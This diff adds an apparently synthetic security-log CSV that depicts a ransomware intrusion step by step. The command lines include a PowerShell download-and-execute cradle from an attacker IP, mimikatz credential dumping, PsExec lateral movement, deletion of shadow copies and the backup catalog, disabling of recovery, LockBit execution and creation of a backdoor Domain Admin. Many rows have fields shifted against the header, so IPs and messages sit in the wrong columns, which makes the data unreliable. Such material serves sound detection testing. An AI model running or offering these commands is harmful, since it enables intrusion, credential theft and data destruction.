@@ -1,0 +1,30 @@
+_time,host,EventCode,user,process_name,parent_process_name,command_line,src_ip,dest_ip,dest_port,protocol,file_name,file_path,QueryName,QueryResults,Logon_Type,TaskName,message,sourcetype
+2025-07-09T02:00:00Z,dc-01,4625,admin,,,185.220.101.45,10.10.1.5,,,,,,,10,,Failed login - brute force attempt 1,WinEventLog
+2025-07-09T02:00:05Z,dc-01,4625,admin,,,185.220.101.45,10.10.1.5,,,,,,,10,,Failed login - brute force attempt 2,WinEventLog
+2025-07-09T02:00:10Z,dc-01,4625,admin,,,185.220.101.45,10.10.1.5,,,,,,,10,,Failed login - brute force attempt 3,WinEventLog
+2025-07-09T02:00:15Z,dc-01,4625,admin,,,185.220.101.45,10.10.1.5,,,,,,,10,,Failed login - brute force attempt 4,WinEventLog
+2025-07-09T02:00:20Z,dc-01,4625,admin,,,185.220.101.45,10.10.1.5,,,,,,,10,,Failed login - brute force attempt 5,WinEventLog
+2025-07-09T02:00:30Z,dc-01,4624,admin,,,185.220.101.45,10.10.1.5,,,,,,,10,,Successful login after brute force,WinEventLog
+2025-07-09T02:01:00Z,dc-01,1,admin,cmd.exe,svchost.exe,cmd.exe /c whoami,,,,,,,,,,sysmon
+2025-07-09T02:01:05Z,dc-01,1,admin,cmd.exe,cmd.exe,cmd.exe /c net user /domain,,,,,,,,,,sysmon
+2025-07-09T02:01:10Z,dc-01,1,admin,cmd.exe,cmd.exe,cmd.exe /c net group "Domain Admins" /domain,,,,,,,,,,sysmon
+2025-07-09T02:01:30Z,dc-01,1,admin,powershell.exe,cmd.exe,powershell.exe -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://185.220.101.45/payload.ps1')",,,,,,,,,,sysmon
+2025-07-09T02:01:35Z,dc-01,22,admin,powershell.exe,,,,,,,,,evil-c2-server.ru,185.220.101.45,,,DNS query to known C2,sysmon
+2025-07-09T02:01:40Z,dc-01,,,,,10.10.1.5,185.220.101.45,443,TCP,,,,,,,Outbound C2 connection,firewall
+2025-07-09T02:02:00Z,dc-01,11,,powershell.exe,,,,,,mimikatz.exe,C:\Windows\Temp\mimikatz.exe,,,,,Credential dumping tool dropped,sysmon
+2025-07-09T02:02:10Z,dc-01,1,admin,mimikatz.exe,powershell.exe,mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit,,,,,,,,,,sysmon
+2025-07-09T02:02:15Z,dc-01,4672,admin,,,,,,,,,,,,Special privileges assigned - admin token,WinEventLog
+2025-07-09T02:03:00Z,dc-01,1,admin,psexec.exe,cmd.exe,psexec.exe \\file-server-01 cmd.exe,10.10.1.5,10.10.1.20,445,TCP,,,,,,,Lateral movement via PsExec,sysmon
+2025-07-09T02:03:05Z,file-server-01,4624,admin,,,10.10.1.5,10.10.1.20,,,,,,,3,,Lateral movement - network logon from DC,WinEventLog
+2025-07-09T02:03:30Z,file-server-01,1,admin,vssadmin.exe,cmd.exe,vssadmin.exe delete shadows /all /quiet,,,,,,,,,,Shadow copy deletion - ransomware prep,sysmon
+2025-07-09T02:03:35Z,file-server-01,1,admin,wbadmin.exe,cmd.exe,wbadmin.exe delete catalog -quiet,,,,,,,,,,Backup catalog deletion,sysmon
+2025-07-09T02:03:40Z,file-server-01,1,admin,bcdedit.exe,cmd.exe,bcdedit.exe /set {default} recoveryenabled no,,,,,,,,,,Recovery disabled,sysmon
+2025-07-09T02:04:00Z,file-server-01,11,,cmd.exe,,,,,,lockbit3.exe,C:\Windows\Temp\lockbit3.exe,,,,,Ransomware binary dropped,sysmon
+2025-07-09T02:04:05Z,file-server-01,1,admin,lockbit3.exe,cmd.exe,lockbit3.exe --encrypt-all --note README_RESTORE.txt,,,,,,,,,,Ransomware execution,sysmon
+2025-07-09T02:04:10Z,file-server-01,11,,lockbit3.exe,,,,,,README_RESTORE.txt,C:\Users\Public\Desktop\README_RESTORE.txt,,,,,Ransom note created,sysmon
+2025-07-09T02:04:15Z,file-server-01,,,,,10.10.1.20,185.220.101.45,443,TCP,,,,,,,Data exfiltration to C2,firewall
+2025-07-09T02:04:20Z,file-server-01,,,,,10.10.1.20,185.220.101.45,443,TCP,,,,,,,Data exfiltration continued,firewall
+2025-07-09T02:04:25Z,file-server-01,,,,,10.10.1.20,185.220.101.45,443,TCP,,,,,,,Large outbound transfer 500MB,firewall
+2025-07-09T02:05:00Z,dc-01,4720,admin,,,,,,,,,,,,,New user created: backdoor_svc,WinEventLog
+2025-07-09T02:05:05Z,dc-01,4728,admin,,,,,,,,,,,,,backdoor_svc added to Domain Admins,WinEventLog
+2025-07-09T02:05:30Z,dc-01,4698,admin,,,,,,,,,,,,PersistenceTask,Scheduled task for persistence,WinEventLog
